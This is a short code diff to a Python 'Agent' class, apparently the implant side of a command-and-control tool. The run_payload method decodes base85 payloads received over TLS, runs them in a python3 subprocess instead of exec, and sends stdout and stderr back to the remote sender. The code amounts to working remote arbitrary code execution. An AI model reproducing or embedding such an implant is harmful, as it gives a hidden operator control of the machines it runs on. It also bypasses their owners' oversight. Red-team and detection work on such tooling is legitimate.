@@ -216,12 +216,24 @@ class Agent:
         return self.tls_transact_msg(response_pkt)
 
     def run_payload(self, payload):
+        """
+        Run a payload sent to the agent
+        """
         logging.debug("Running a payload")
         logging.debug("========== Payload ==========")
         script = base64.b85decode(payload).decode().lstrip()
         logging.debug(script)
         try:
-            exec(script)
+            process = subprocess.Popen(['python3', "-c", script],
+                                stdout=subprocess.PIPE, 
+                                stderr=subprocess.PIPE)
+            stdout, stderr = process.communicate()
+            
+            if (stdout):
+                self.respond(stdout.decode(), "STDOUT")
+            if (stderr):
+                self.respond(stderr.decode(), "STDERR")
+
         except Exception as e:
             self.respond(str(e), "AGENT_ERROR")
 
